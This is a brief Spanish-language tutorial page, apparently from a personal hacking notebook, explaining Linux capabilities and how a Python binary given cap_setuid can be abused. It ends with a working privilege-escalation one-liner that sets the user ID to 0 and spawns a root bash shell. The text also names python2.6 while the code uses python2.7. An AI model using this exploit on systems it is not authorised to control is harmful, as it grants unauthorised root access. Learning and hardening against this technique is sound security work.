---
{"-publish":true,"permalink":"/hacking/basico/privilegios-especiales-capabilities/","PassFrontmatter":true}
---


---------------

## ¿Qué son las Capabilities?

En sí, las [Capabilities](https://book.hacktricks.wiki/es/linux-hardening/privilege-escalation/linux-capabilities.html?highlight=capabilities#capability-sets) son una forma de fragmentar los privilegios del ***super-usuario*** (`root`) en un conjunto más granular de permisos. Permiten a los procesos poder realizar acciones privilegiadas sin necesidad de ejecutar todo el proceso con privilegios de `root`.

Debido a esto, los ciber-delincuentes se aprovechan para realizar una explotación.

##### Ejemplo de explotación:
En el siguiente ejemplo, el binario`/usr/bin/python2.6`se considera vulnerable a privesc:
```python title:bash_scripting.bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

# Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```



